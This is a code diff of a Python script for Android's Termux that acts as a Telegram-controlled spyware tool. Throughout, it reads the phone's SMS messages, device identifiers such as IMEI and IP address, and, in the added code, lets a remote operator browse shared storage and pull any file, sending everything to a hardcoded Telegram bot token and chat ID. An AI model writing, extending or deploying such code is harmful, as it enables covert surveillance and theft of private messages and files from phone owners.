@@ -1,11 +1,14 @@
-import subprocess
+import os
 import requests
 import json
-import socket
+import subprocess
 
 # Replace with your bot token and chat ID
 TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
 CHAT_ID = '6285177516'
+
+# Global variable to store current folder path
+current_folder = "/storage/emulated/0/"
 
 # Function to send message to Telegram
 def send_to_telegram(message):
@@ -24,82 +27,129 @@ def send_to_telegram(message):
     except Exception as e:
         print(f"Error sending message: {str(e)}")
 
-# Function to get device info using Termux API
+# Function to get SMS details
+def get_sms():
+    try:
+        result = subprocess.run(['termux-sms-list'], stdout=subprocess.PIPE)
+        sms_list = json.loads(result.stdout.decode('utf-8'))
+        if sms_list:
+            messages = []
+            for sms in sms_list:
+                sender = sms.get('sender', 'Unknown')
+                message = sms.get('body', '')
+                messages.append(f"From: {sender}\nMessage: {message}\n")
+            return "\n".join(messages)
+        else:
+            return "No SMS messages found."
+    except Exception as e:
+        return f"Error retrieving SMS: {str(e)}"
+
+# Function to get device information
 def get_device_info():
     try:
         device_info = {}
+        
+        # Get device model and name
+        device_info['Model'] = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
+        device_info['Device Name'] = subprocess.check_output(['getprop', 'ro.product.device']).decode().strip()
 
-        # Get device model
-        model = subprocess.check_output(['termux-info']).decode('utf-8')
-        device_info["Model"] = model
+        # Get Android version
+        device_info['Android Version'] = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()
+
+        # Get IMEI (requires root access)
+        try:
+            device_info['IMEI'] = subprocess.check_output(['termux-telephony-deviceinfo']).decode().strip()
+        except Exception:
+            device_info['IMEI'] = "IMEI access denied or requires root."
 
         # Get battery status
-        battery_status = subprocess.check_output(['termux-battery-status']).decode('utf-8')
-        battery = json.loads(battery_status)
-        device_info["Battery Level"] = battery.get("percentage", "Unknown")
-        device_info["Battery Status"] = battery.get("status", "Unknown")
+        battery_status = subprocess.check_output(['termux-battery-status']).decode().strip()
+        device_info['Battery'] = battery_status
 
         # Get IP Address
-        ip_address = socket.gethostbyname(socket.gethostname())
-        device_info["IP Address"] = ip_address
+        ip_address = subprocess.check_output(['ip', 'addr', 'show', 'wlan0']).decode().strip()
+        device_info['IP Address'] = ip_address
 
-        # Get SIM Information
-        sim_info = subprocess.check_output(['termux-telephony-deviceinfo']).decode('utf-8')
-        device_info["SIM Info"] = sim_info
-
-        # Preparing the message
-        message = "*Device Information:*\n\n"
-        for key, value in device_info.items():
-            message += f"{key}: {value}\n"
-        
-        send_to_telegram(message)
-    
+        # Format the device info for Telegram
+        info_message = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
+        return info_message
     except Exception as e:
-        send_to_telegram(f"Error getting device info: {str(e)}")
+        return f"Error retrieving device info: {str(e)}"
 
-# Function to get SMS messages using Termux API
-def get_sms_messages():
+# Function to handle folder navigation
+def handle_folder_navigation(folder_name):
+    global current_folder
     try:
-        # Get SMS list
-        sms_list = subprocess.check_output(['termux-sms-list']).decode('utf-8')
-        sms_data = json.loads(sms_list)
+        # Update the current folder path
+        new_folder_path = os.path.join(current_folder, folder_name)
         
-        if len(sms_data) == 0:
-            send_to_telegram("No SMS messages found.")
-            return
-
-        sms_messages = []
-        for sms in sms_data:
-            sender = sms.get('address', 'Unknown')
-            body = sms.get('body', 'No message')
-            sms_messages.append(f"From: `{sender}`\nMessage: {body}")
-
-        sms_text = "\n\n".join(sms_messages)
-        send_to_telegram(f"*SMS Messages:*\n\n{sms_text}")
-    
+        if os.path.isdir(new_folder_path):
+            current_folder = new_folder_path
+            file_list = os.listdir(current_folder)
+            if file_list:
+                file_list_message = f"*Contents of `{current_folder}`:*\n"
+                file_list_message += "\n".join([f"`{file}`" for file in file_list])
+                file_list_message += "\n\nSend the file name to download it, or folder name to navigate."
+                send_to_telegram(file_list_message)
+            else:
+                send_to_telegram("No files or folders found.")
+        else:
+            send_to_telegram(f"`{folder_name}` is not a valid folder.")
     except Exception as e:
-        send_to_telegram(f"Error getting SMS messages: {str(e)}")
+        send_to_telegram(f"Error navigating folder: {str(e)}")
 
-# Function to handle incoming Telegram commands
-def handle_telegram_command(command):
-    if command == "/device":
-        get_device_info()
-    elif command == "/sms":
-        get_sms_messages()
-    else:
-        send_to_telegram("Invalid command. Use /device to get device info or /sms to get SMS messages.")
-
-# Function to handle incoming Telegram updates
+# Telegram bot logic to handle file, folder, SMS, and device requests
 def handle_telegram_update(update):
     try:
         message = update.get('message', {}).get('text', '')
         if message:
-            handle_telegram_command(message)
+            if message == "/sms":
+                sms_messages = get_sms()
+                send_to_telegram(sms_messages)
+            
+            elif message == "/device":
+                device_info = get_device_info()
+                send_to_telegram(device_info)
+
+            elif message == "/sdcard":
+                global current_folder
+                current_folder = "/storage/emulated/0/"
+                send_to_telegram(f"Navigating to SD card: `{current_folder}`")
+                handle_folder_navigation("")  # Show initial folder contents
+
+            else:
+                folder_path = os.path.join(current_folder, message)
+                if os.path.isdir(folder_path):
+                    handle_folder_navigation(message)
+                else:
+                    response_message = download_file(message)
+                    send_to_telegram(response_message)
     
     except Exception as e:
         send_to_telegram(f"Error in Telegram update: {str(e)}")
 
-# Function to listen for Telegram updates
+# Function to download a specific file
+def download_file(file_name):
+    try:
+        file_path = os.path.join(current_folder, file_name)
+        
+        if os.path.isfile(file_path):
+            # Send the file to Telegram
+            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+            files = {'document': open(file_path, 'rb')}
+            data = {"chat_id": CHAT_ID}
+            response = requests.post(url, files=files, data=data)
+            
+            if response.status_code == 200:
+                return f"File `{file_name}` sent successfully!"
+            else:
+                return f"Failed to send file. Status code: {response.status_code}, Response: {response.text}"
+        else:
+            return f"File `{file_name}` does not exist or is not a valid file."
+    except Exception as e:
+        return f"Error downloading file: {str(e)}"
+
+# Example of how to handle incoming Telegram updates
 def listen_for_updates():
     last_update_id = None
     url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
@@ -114,5 +164,9 @@ def listen_for_updates():
             handle_telegram_update(update)
 
 if __name__ == "__main__":
-    # Start listening for Telegram updates
+    # Step 1: Start in the base folder and show the list of files/folders
+    send_to_telegram(f"Current folder: `{current_folder}`")
+    handle_folder_navigation("")  # Show initial folder contents
+    
+    # Step 2: Listen for user input (folder, file, SMS, or device info)
     listen_for_updates()
